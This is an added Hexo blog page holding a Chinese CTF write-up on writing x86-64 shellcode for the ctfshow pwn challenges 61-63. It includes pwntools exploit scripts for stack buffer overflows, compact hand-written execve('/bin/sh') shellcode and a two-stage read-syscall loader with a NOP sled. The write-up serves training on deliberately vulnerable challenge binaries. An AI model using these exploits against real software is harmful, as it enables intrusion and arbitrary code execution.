@@ -1,0 +1,673 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="WangYiHao">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="shellcode编写—ctfshow61-62-63  之所以把这三道题放在一起，是因为它们都涉及shellcode的编写，但是其实题目出的有时候搞不清楚出题人的意思：这些题目呢，栈段都是可读可写可执行的，不用怀疑 首先呢，ctfshow61：  一个是去泄露栈的地址，另一个是写入shellcode，于一般题目不同的是，这个题目的shellcode得写到返回地址的后面，因为v5只有0x10大小，">
+<meta property="og:type" content="article">
+<meta property="og:title" content="shellcode编写—ctfshow61-62-63">
+<meta property="og:url" content="http://example.com/2024/08/02/shellcode%E7%BC%96%E5%86%99%E2%80%94ctfshow61-62-63/index.html">
+<meta property="og:site_name" content="pwn二进制初研究">
+<meta property="og:description" content="shellcode编写—ctfshow61-62-63  之所以把这三道题放在一起，是因为它们都涉及shellcode的编写，但是其实题目出的有时候搞不清楚出题人的意思：这些题目呢，栈段都是可读可写可执行的，不用怀疑 首先呢，ctfshow61：  一个是去泄露栈的地址，另一个是写入shellcode，于一般题目不同的是，这个题目的shellcode得写到返回地址的后面，因为v5只有0x10大小，">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2024/08/02/shellcode%E7%BC%96%E5%86%99%E2%80%94ctfshow61-62-63/1.png">
+<meta property="og:image" content="http://example.com/2024/08/02/shellcode%E7%BC%96%E5%86%99%E2%80%94ctfshow61-62-63/2.png">
+<meta property="og:image" content="http://example.com/2024/08/02/shellcode%E7%BC%96%E5%86%99%E2%80%94ctfshow61-62-63/3.png">
+<meta property="og:image" content="http://example.com/2024/08/02/shellcode%E7%BC%96%E5%86%99%E2%80%94ctfshow61-62-63/4.png">
+<meta property="og:image" content="http://example.com/2024/08/02/shellcode%E7%BC%96%E5%86%99%E2%80%94ctfshow61-62-63/5.png">
+<meta property="og:image" content="http://example.com/2024/08/02/shellcode%E7%BC%96%E5%86%99%E2%80%94ctfshow61-62-63/6.png">
+<meta property="og:image" content="http://example.com/2024/08/02/shellcode%E7%BC%96%E5%86%99%E2%80%94ctfshow61-62-63/blog/source_posts/shellcode%E7%BC%96%E5%86%99%E2%80%94ctfshow61-62-63/7.png">
+<meta property="og:image" content="http://example.com/2024/08/02/shellcode%E7%BC%96%E5%86%99%E2%80%94ctfshow61-62-63/8.png">
+<meta property="article:published_time" content="2024-08-02T08:10:41.000Z">
+<meta property="article:modified_time" content="2024-08-02T10:08:46.782Z">
+<meta property="article:author" content="WangYiHao">
+<meta property="article:tag" content="shellcode书写">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/2024/08/02/shellcode%E7%BC%96%E5%86%99%E2%80%94ctfshow61-62-63/1.png">
+  
+  
+  
+  <title>shellcode编写—ctfshow61-62-63 - pwn二进制初研究</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>pwn浅研</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="shellcode编写—ctfshow61-62-63"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-08-02 16:10" pubdate>
+          2024年8月2日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.3k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          12 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">shellcode编写—ctfshow61-62-63</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 align="center">shellcode编写—ctfshow61-62-63</h1>
+
+<p>之所以把这三道题放在一起，是因为它们都涉及shellcode的编写，但是其实题目出的有时候搞不清楚出题人的意思：这些题目呢，栈段都是可读可写可执行的，不用怀疑</p>
+<p>首先呢，ctfshow61：</p>
+<p><img src="/2024/08/02/shellcode%E7%BC%96%E5%86%99%E2%80%94ctfshow61-62-63/1.png" srcset="/img/loading.gif" lazyload alt="1"></p>
+<p>一个是去泄露栈的地址，另一个是写入shellcode，于一般题目不同的是，这个题目的shellcode得写到返回地址的后面，因为v5只有0x10大小，是不够书写shellcode的：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-h&#x27;</span>]<br><br><span class="hljs-comment">#sh = process(&quot;./pwn&quot;)</span><br>sh = remote(<span class="hljs-string">&quot;pwn.challenge.ctf.show&quot;</span>,<span class="hljs-number">28279</span>)<br>sh.recvuntil(<span class="hljs-string">&quot;What&#x27;s this : [&quot;</span>)<br>stack_addr = <span class="hljs-built_in">int</span>(sh.recv(<span class="hljs-number">14</span>),<span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;stack_addr----------&gt;&quot;</span>, <span class="hljs-built_in">hex</span>(stack_addr))<br><br>sh.recvuntil(<span class="hljs-string">&quot;Maybe it&#x27;s useful ! But how to use it?\n&quot;</span>)<br>shellcode = asm(shellcraft.sh())<br><br>payload = <span class="hljs-string">b&quot;A&quot;</span>*(<span class="hljs-number">0x10</span>+<span class="hljs-number">0x8</span>) + p64(stack_addr+<span class="hljs-number">0x20</span>) + shellcode<br><br>sh.sendline(payload)<br>sh.interactive()<br></code></pre></td></tr></table></figure>
+
+<p>因为gets函数读取是没有限制的，所以说我们就可以用占用空间较大，但是可以直接生成的shellcode，即shellcode &#x3D; asm(shellcraft.sh())，那至于payload中的stack_addr为啥要加0x20，直接用gdb调试一下就可以知道了：</p>
+<p><img src="/2024/08/02/shellcode%E7%BC%96%E5%86%99%E2%80%94ctfshow61-62-63/2.png" srcset="/img/loading.gif" lazyload alt="2"></p>
+<p>这道题呢，非常的简单，我们看下面的：</p>
+<p>ctfshow62：</p>
+<p><img src="/2024/08/02/shellcode%E7%BC%96%E5%86%99%E2%80%94ctfshow61-62-63/3.png" srcset="/img/loading.gif" lazyload alt="3"></p>
+<p>其实呢，就是对读取做了限制，限制了我们输入的字符数量，所以我们没办法用pwntools去生成shellcode了，仔细算一算，我们能写入的shellcode字节数非常少，0x38-0x10（buf本生大小）-0x8(old ebp)-0x8(ret_addr)，其实只有0x18字节，那么接下来，我们就开始手写shellcode：</p>
+<p>其实我们无外乎就是执行system(“&#x2F;bin&#x2F;sh”,0,0)函数，我们可以使用系统调用，因为是64位程序，即为syscall，手写汇编如下：</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rcx</span>, <span class="hljs-number">0x0068732f6e69622f</span><br><span class="hljs-keyword">push</span> <span class="hljs-built_in">rcx</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>,<span class="hljs-built_in">rsp</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>,<span class="hljs-number">0</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>,<span class="hljs-number">0</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>,<span class="hljs-number">59</span><br><span class="hljs-keyword">syscall</span><br></code></pre></td></tr></table></figure>
+
+<p>0x0068732f6e69622f就是”&#x2F;bin&#x2F;sh\x00”为啥要\x00呢，我认为是两个原因，其一是凑齐8字节，其二是00截断字符，设置rax为59是因为，此时的系统调用正好为system函数（rax的值就是系统调用号），其它的寄存器都是用来传参的，不多赘述，但其实这样，所用的空间也是比较大的：</p>
+<p><img src="/2024/08/02/shellcode%E7%BC%96%E5%86%99%E2%80%94ctfshow61-62-63/4.png" srcset="/img/loading.gif" lazyload alt="4"></p>
+<p>0x25字节，比我们的0x18还大，显然不行的，那我们只能弃用mov，改用push pop:</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rcx</span>,<span class="hljs-number">0x0068732f6e69622f</span><br>     <span class="hljs-keyword">push</span> <span class="hljs-built_in">rcx</span><br>     <span class="hljs-keyword">push</span> <span class="hljs-built_in">rsp</span><br>     <span class="hljs-keyword">pop</span> <span class="hljs-built_in">rdi</span><br>     <span class="hljs-keyword">xor</span> <span class="hljs-built_in">rsi</span>,<span class="hljs-built_in">rsi</span><br>     <span class="hljs-keyword">xor</span> <span class="hljs-built_in">rdx</span>,<span class="hljs-built_in">rdx</span><br>     <span class="hljs-keyword">push</span> <span class="hljs-number">0x3b</span><br>     <span class="hljs-keyword">pop</span> <span class="hljs-built_in">rax</span><br>     <span class="hljs-keyword">syscall</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2024/08/02/shellcode%E7%BC%96%E5%86%99%E2%80%94ctfshow61-62-63/5.png" srcset="/img/loading.gif" lazyload alt="5"></p>
+<p>可以看到，长度恰好是0x18，还有没有更短的呢，其实是有的，我们将两个异或指令涉及的寄存器改为控制后四个字节的寄存器就行了：</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rcx</span>,<span class="hljs-number">0x0068732f6e69622f</span><br>     <span class="hljs-keyword">push</span> <span class="hljs-built_in">rcx</span><br>     <span class="hljs-keyword">push</span> <span class="hljs-built_in">rsp</span><br>     <span class="hljs-keyword">pop</span> <span class="hljs-built_in">rdi</span><br>     <span class="hljs-keyword">xor</span> <span class="hljs-built_in">esi</span>,<span class="hljs-built_in">esi</span><br>     <span class="hljs-keyword">xor</span> <span class="hljs-built_in">edx</span>,<span class="hljs-built_in">edx</span><br>     <span class="hljs-keyword">push</span> <span class="hljs-number">0x3b</span><br>     <span class="hljs-keyword">pop</span> <span class="hljs-built_in">rax</span><br>     <span class="hljs-keyword">syscall</span><br></code></pre></td></tr></table></figure>
+
+<p>这样就能达到最小的0x16字节了：<img src="/2024/08/02/shellcode%E7%BC%96%E5%86%99%E2%80%94ctfshow61-62-63/6.png" srcset="/img/loading.gif" lazyload alt="6"></p>
+<p>至于能否更短，我认为是可以的，但是呢，就要结合在程序执行shellcode前，寄存器所处的状态决定了，比如：我们执行shellcode前，rsi和rdx均为零，那么就可以省去两行异或的命令。其实这个0x16的shellcode也存在缺陷，就是，执行shellcode前，如果这两个寄存器均写入了8字节的数据，那么这两条异或命令只能将其后4字节置0，会影响system的第二个和第三个参数，但是呢，实际测试下来，好像是不影响的，有懂的师傅可以给我说一说。payload如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-h&#x27;</span>]<br><br><span class="hljs-comment">#sh = process(&quot;./pwn&quot;)</span><br>sh = remote(<span class="hljs-string">&quot;pwn.challenge.ctf.show&quot;</span>,<span class="hljs-number">28278</span>)<br><br>shellcode = asm(<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        mov rcx,0x0068732f6e69622f</span><br><span class="hljs-string">        push rcx</span><br><span class="hljs-string">        push rsp</span><br><span class="hljs-string">        pop rdi</span><br><span class="hljs-string">        xor rsi,rsi</span><br><span class="hljs-string">        xor rdx,rdx</span><br><span class="hljs-string">        push 0x3b</span><br><span class="hljs-string">        pop rax</span><br><span class="hljs-string">        syscall</span><br><span class="hljs-string">&quot;&quot;&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;shellcode_len----------&gt;&quot;</span>,<span class="hljs-built_in">len</span>(shellcode))<br><br>sh.recvuntil(<span class="hljs-string">&quot;What&#x27;s this : [&quot;</span>)<br>stack_addr = <span class="hljs-built_in">int</span>(sh.recv(<span class="hljs-number">14</span>),<span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;stack_addr----------&gt;&quot;</span>,<span class="hljs-built_in">hex</span>(stack_addr))<br><br>sh.recvuntil(<span class="hljs-string">&quot;Maybe it&#x27;s useful ! But how to use it?\n&quot;</span>)<br>payload = <span class="hljs-string">b&quot;A&quot;</span>*(<span class="hljs-number">0x10</span>+<span class="hljs-number">0x8</span>) + p64(stack_addr+<span class="hljs-number">0x20</span>) + shellcode<br>sh.sendline(payload)<br><br>sh.interactive()<br></code></pre></td></tr></table></figure>
+
+<p>我们继续来看，第三个ctfshow63：</p>
+<p><img src="/2024/08/02/shellcode%E7%BC%96%E5%86%99%E2%80%94ctfshow61-62-63/blog\source_posts\shellcode编写—ctfshow61-62-63\7.png" srcset="/img/loading.gif" lazyload alt="7"></p>
+<p>嗯…确实是短了一点，不过呢，我们的0x16shellcode依然能打，但是呢，这样就没啥意思了，从这个题目里面就学不到其它东西了，既然它最后一个函数调用的read，那么，我们不妨使用系统调用，继续调用read函数，去自定义要写入的位置和大小，岂不美哉哈哈哈，我们先看看main函数将要ret时，寄存器的状态：</p>
+<p><img src="/2024/08/02/shellcode%E7%BC%96%E5%86%99%E2%80%94ctfshow61-62-63/8.png" srcset="/img/loading.gif" lazyload alt="8"></p>
+<p>可以看到，rax是0，系统调用正好对应read函数，rdi也是0，第一个参数也不用变，rdx为0x37，也够我们写shellcode，因为我们可以改变rsi，从而改变写入的位置：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-h&#x27;</span>]<br><br><span class="hljs-comment">#sh = process(&quot;./pwn&quot;)</span><br>sh = remote(<span class="hljs-string">&quot;pwn.challenge.ctf.show&quot;</span>,<span class="hljs-number">28150</span>)<br><br>shellcode_1 = asm(<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        mov rcx,0x0068732f6e69622f</span><br><span class="hljs-string">        push rcx</span><br><span class="hljs-string">        push rsp</span><br><span class="hljs-string">        pop rdi</span><br><span class="hljs-string">        xor rsi,rsi</span><br><span class="hljs-string">        xor rdx,rdx</span><br><span class="hljs-string">        push 0x3b</span><br><span class="hljs-string">        pop rax</span><br><span class="hljs-string">        syscall</span><br><span class="hljs-string">&quot;&quot;&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;shellcode_1_len----------&gt;&quot;</span>,<span class="hljs-built_in">len</span>(shellcode_1))<span class="hljs-comment"># 0x18</span><br><br>sh.recvuntil(<span class="hljs-string">&quot;What&#x27;s this : [&quot;</span>)<br>stack_addr = <span class="hljs-built_in">int</span>(sh.recv(<span class="hljs-number">14</span>),<span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;stack_addr----------&gt;&quot;</span>,<span class="hljs-built_in">hex</span>(stack_addr))<br><br><br>shellcode_2 = asm(<span class="hljs-string">f&quot;&quot;&quot;</span><br><span class="hljs-string">        mov rsi, <span class="hljs-subst">&#123;stack_addr + <span class="hljs-number">0x20</span>&#125;</span></span><br><span class="hljs-string">        syscall</span><br><span class="hljs-string">&quot;&quot;&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;shellcode_2_len----------&gt;&quot;</span>,<span class="hljs-built_in">len</span>(shellcode_2))<span class="hljs-comment"># 0xc</span><br><br>sh.recvuntil(<span class="hljs-string">&quot;Maybe it&#x27;s useful ! But how to use it?\n&quot;</span>)<br><span class="hljs-comment">#gdb.attach(sh)</span><br>payload = <span class="hljs-string">b&quot;A&quot;</span>*(<span class="hljs-number">0x10</span>+<span class="hljs-number">0x8</span>) + p64(stack_addr+<span class="hljs-number">0x20</span>) + shellcode_2<br>sh.sendline(payload)<br><br>sleep(<span class="hljs-number">0.1</span>)<br><span class="hljs-comment">#pause()</span><br>payload = <span class="hljs-string">b&quot;\x90&quot;</span>*(<span class="hljs-number">0x10</span>) + shellcode_1<br>sh.sendline(payload)<br><br>sh.interactive()<br></code></pre></td></tr></table></figure>
+
+<p>我们把rsi改成了stack_addr + 0x20的位置，因为rip在main函数ret时候，已经指向了栈区域的stack_addr+0x20地址，而shellcode_2也占据了一定的大小，所以我写入了0x10个0x90（nop指令）来利用nop滑梯，滑向我们的shellcode_1，从而成功get，over。</p>
+<p>注：要是觉得大小不够，也可以用R11寄存器去改变RDX寄存器，但是这题没必要。</p>
+<p>贴个好东西：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/13813?time__1311=GqmxnD0GKmqqlhzG7DyiYG8YDkKOmhfQ3x#toc-4">shellcode进阶之手写shellcode - 先知社区 (aliyun.com)</a></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/shellcode%E4%B9%A6%E5%86%99/" class="print-no-link">#shellcode书写</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>shellcode编写—ctfshow61-62-63</div>
+      <div>http://example.com/2024/08/02/shellcode编写—ctfshow61-62-63/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>WangYiHao</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年8月2日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/08/07/unlink-%E5%A0%86%E6%BA%A2%E5%87%BA/" title="unlink_堆溢出">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">unlink_堆溢出</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/07/31/axb-2019-fmt32/" title="axb_2019_fmt32">
+                        <span class="hidden-mobile">axb_2019_fmt32</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
